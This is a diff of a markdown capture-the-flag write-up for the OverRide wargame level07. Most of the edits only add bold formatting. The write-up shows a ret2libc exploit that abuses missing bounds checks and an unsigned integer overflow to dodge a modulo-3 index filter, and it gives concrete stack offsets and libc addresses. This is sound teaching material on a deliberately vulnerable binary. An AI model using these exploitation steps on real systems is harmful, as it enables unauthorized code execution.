@@ -52,17 +52,11 @@ Input command: quit
 level07@OverRide:~$ 
 ```
 
-The program wait for 3 differents commands that controls a data storage service.
+The program **waits** for **3 different commands** that control a **data storage service**.
 
-But it look like there is no verification on the user input, and is possible to read out of the data storage.
+It looks like there is **no verification** on the **user input**, and it is possible to **read out** of the data storage.
 
-And there is some index that are reserved by "wil".
-
-The program waits for 3 different commands that control a data storage service.
-
-It looks like there is no verification on the user input, and it is possible to read out of the data storage.
-
-And some indices appear to be reserved by "wil".
+And **some indices** appear to be **reserved** by **`"wil"`**.
 
 ## 2. Analyze The Executable
 
@@ -84,29 +78,29 @@ Non-debugging symbols:
 
 The `main` function enters a command loop.
 
-It accepts three commands: "store" *(calls `store_number()`)*, "read" *(calls `read_number()`)*, and "quit" *(exits the program)*.
+It accepts 3 commands: **`"store"`** *(calls `store_number()`)*, **`"read"`** *(calls `read_number()`)*, and **`"quit"`** *(exits the program)*.
 
 #### read_number function
 
-The `read_number` function prompts for an index and displays the value stored at `data[index]`.
+The `read_number` function **prompts** for an **index** and **displays** the value stored at `data[index]`.
 
 There is no bounds checking, allowing reads anywhere in memory.
 
 #### store_number function
 
-The `store_number` function prompts for a number and index, then stores the number at `data[index]`.
+The `store_number` function **prompts** for a **number** and **index**, then stores the number at `data[index]`.
 
-It rejects indices that are multiples of 3 *(index reserved by wil)* or numbers starting with `0xb7` *(meaning stack addresses)*.
+It **rejects indices** that are **multiples of 3** *(index reserved by wil)* or numbers starting with `0xb7` *(meaning stack addresses)*.
 
 ## 3. Identify The Vulnerability
 
-The `store` and `read` functions lack proper bounds checking on the array index.
+The `store` and `read` functions **lack proper bounds checking** on the array index.
 
-We can write beyond the 100-element array directly into the stack, allowing us to overwrite the `SAVED EIP` and execute a `ret2libc` attack.
+We can **write beyond** the **100-element array** directly into the stack, allowing us to **overwrite** the `SAVED EIP` and **execute** a `ret2libc` attack.
 
 ### ret2libc Exploit
 
-The ret2libc payload pattern on the stack is:
+The **ret2libc payload pattern** on the **stack** is:
 
 ```
 EBP + 12	[  arg 2  ]		[ "/bin/sh" address ]
@@ -121,11 +115,11 @@ EBP + 8		[  arg 1  ]		[ "/bin/sh" address ]
 EBP + 4		[SAVED EIP]		[ exit address ]
 ```
 
-We'll use the `store` command to write these values beyond the array bounds, setting up a `ret2libc` attack when the program returns.
+We'll use the **`store` command** to **write** these values **beyond the array bounds**, setting up a `ret2libc` attack when the program returns.
 
 ### Get Exploit Values
 
-First, we need to find the addresses : 
+First, we need to **find the addresses** : 
 - system
 - exit *(optional)*
 - "/bin/sh"
@@ -185,7 +179,7 @@ So SAVED EIP is at `0xffffd69c`.
 
 ---
 
-From the C and assembly, the data array *(`local_1bc` in C file)* starts at `ESP + 0x24`:
+From the **C** and **assembly**, the data array *(`local_1bc` in C file)* starts at `ESP + 0x24`:
 
 ```c
 undefined4 local_1bc [100];
@@ -222,7 +216,7 @@ ____________________________________
 114 % 3 = 0
 ```
 
-Index 114 is rejected because of the wil reserved index :
+**Index 114** is rejected because of the **wil reserved index** :
 ```c
   if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
     puts(" *** ERROR! ***");
@@ -234,16 +228,16 @@ We cannot write this value as a storage index.
 
 ### UInteger Overflow Bypass
 
-But because of how the array position is selected, we can use a Interger Overflow.
+But because of how the array position is selected, we can use a **Interger Overflow**.
 
 ```c
     *(uint *)(uVar2 * 4 + param_1) = uVar1;
 ```
 
-The `store` function calculates the address as `data + (index * 4)`, with the index being a unsigned int.
+The `store` function **calculates** the address as `data + (index * 4)`, with the index being a **unsigned int**.
 
 
-The maximum uint value is `4294967295`, so:
+The **maximum uint** value is `4294967295`, so:
 ```
 4294967295 + 1 = 4294967296 (wraps to index 0)
 4294967296 / 4 = 1073741824 (wraps to index 0)
@@ -254,13 +248,13 @@ _____________________________________________________
 1073741824 + 114 = 1073741938
 ```
 
-The index `1073741938` overflows and writes to position `114`, bypassing the modulo 3 check.
+The index `1073741938` overflows and writes to position **`114`**, bypassing the modulo 3 check.
 
 ---
 
 ### Calculate Final Values
 
-We need to convert the addresses in decimal, since they are stored as uint values :
+We need to **convert** the **addresses in decimal**, since they are stored as **uint values** :
 
 ```
 system	:	0xf7e6aed0	=	4159090384
@@ -270,7 +264,7 @@ exit	:	0xf7e5eb70	=	4159040368
 /bin/sh	:	0xf7f897ec	=	4160264172
 ```
 
-And with the position of SAVED EIP at table[114], we can deduce :
+And with the position of `SAVED EIP` at `table[114]`, we can deduce :
 
 ```
 EBP + 12	[  arg 2  ]	 |	[ table[116] ]	:	system	:	0xf7e6aed0	=	4159090384
